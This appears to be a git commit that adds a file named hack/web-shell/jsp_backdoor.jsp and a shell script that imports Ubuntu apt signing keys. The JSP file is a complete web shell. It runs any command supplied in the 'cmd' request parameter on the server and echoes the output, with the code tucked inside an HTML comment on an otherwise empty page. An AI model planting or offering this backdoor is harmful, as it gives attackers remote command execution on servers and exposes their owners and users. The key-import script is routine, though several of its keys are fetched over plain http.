bf0b5cc9eae503d2c841ef439d6536d761531931
appleshan <apple.shan@gmail.com>
2016-04-25 14:39:26 +0800

    first post

---
+++ hack/web-shell/jsp_backdoor.jsp
@@ -0,0 +1,9 @@
+<html>
+<head>
+<!-- <% if (request.getParameter("cmd") != null) { out.println("Command: " + request.getParameter("cmd") + "<br />"); Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null )
+{ out.println(disr); disr = dis.readLine(); } } %> 
+-->
+</head>
+<body>
+</body>
+</html>
---
+++ package/keyserver.sh
@@ -0,0 +1,47 @@
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 6E80C6B7
+sudo apt-key adv --keyserver keys.gnupg.net --recv-keys 6BF18B15
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C6DAEA80
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 5ED1D082  
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 044A3B98
+sudo apt-key adv --keyserver pgp.mit.edu --recv-keys 5044912E
+
+sudo apt-get update && sudo apt-get install faenza-icon-theme && sudo apt-get install equinox-theme    
+
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys F2A61FE5
+
+wget -q -O- http://archive.getdeb.net/getdeb-archive.key | sudo apt-key add -
+
+sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com 614C4B38
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B1510FD
+
+## wget -q https://dl-ssl.google.com/linux/linux_signing_key.pub -O- | sudo apt-key add -
+
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 1378B444
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv 7F0CEB10
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys  247510BE
+
+sudo wget -O - http://apt.mucommander.com/apt.key | sudo apt-key add - 
+
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys EEA14886
+
+wget -q http://download.opensuse.org/repositories/isv:ownCloud:community/xUbuntu_14.04/Release.key -O- | sudo apt-key add -
+
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A1F196A8
+
+wget -O- http://archive.getdeb.net/getdeb-archive.key | sudo apt-key add -
+## wget -q http://plexapp.com/plex_pub_key.pub -O- | sudo apt-key add -
+
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3A17F739
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys F24AEA9FB05498B7
+
+gpg --keyserver subkeys.pgp.net --recv 886DDD89 && gpg --export --armor 886DDD89  | sudo apt-key add -
+
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 0624A220
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys FC91AE7E
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 0FEB6DD9
+
+wget -q http://download.virtualbox.org/virtualbox/debian/oracle_vbox.asc -O- | sudo apt-key add -
+
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys F9CB8DB0
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys AF1CDFA9
+
